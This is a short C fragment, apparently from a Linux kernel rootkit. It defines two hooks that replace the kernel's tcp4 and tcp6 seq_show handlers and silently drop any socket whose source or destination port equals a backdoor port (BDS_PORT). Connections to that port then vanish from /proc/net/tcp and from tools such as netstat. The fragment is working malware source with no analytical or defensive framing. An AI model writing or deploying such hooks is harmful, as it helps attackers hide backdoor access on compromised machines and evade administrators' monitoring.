static asmlinkage int bds_tcp4_seq_show(struct seq_file *seq, void *v)
{
	struct inet_sock *is;
	long ret;
	unsigned short port = htons(atoi(BDS_PORT));

	if (v != SEQ_START_TOKEN) {
		is = (struct inet_sock *)v;
		if (port == is->inet_sport || port == is->inet_dport) {
			return 0;
		}
	}

	ret = orig_tcp4_seq_show(seq, v);
	return ret;
}

static asmlinkage int bds_tcp6_seq_show(struct seq_file *seq, void *v) {
	struct inet_sock *is;
	long ret;
	unsigned short port = htons(atoi(BDS_PORT));

	if (v != SEQ_START_TOKEN) {
		is = (struct inet_sock *)v;
		if (port == is->inet_sport || port == is->inet_dport) {
			return 0;
		}
	}
	ret = orig_tcp6_seq_show(seq, v);
	return ret;
}
